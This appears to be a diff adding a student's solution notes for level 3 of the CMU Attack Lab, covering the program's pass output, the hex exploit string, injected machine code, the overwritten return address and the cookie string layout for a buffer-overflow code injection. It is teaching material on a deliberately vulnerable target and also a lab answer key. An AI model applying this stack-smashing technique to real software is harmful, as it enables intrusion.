@@ -1,0 +1,27 @@
+Output:
+./ctarget -q -i ctarget_inputs_hex.txt
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 01 02 03 04 05 06 07 08 09 01 02 03 04 05 06 07 08 09 01 02 03 04 05 06 07 08 09 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
+
+1) string representation of cookie 0x59b997fa
+-> "59b997fa" -> 0x35 39 62 39 39 37 66 61 00
+(don't forget the end null)
+
+2) Injected byte code (13 bytes):
+48 c7 c7 a8 dc 61 55
+68 fa 18 40 00
+c3
+
+3) Modify the return address from 0x401976 to 0x5561dc78
+
+4) construct the string input to be:
+Injected codes (13 bytes)
++ dummy 27 bytes
++ 0x5561dc78 in string (augment to 8 bytes)
++ [cookie string value in hex] 35 39 62 39 39 37 66 61 00
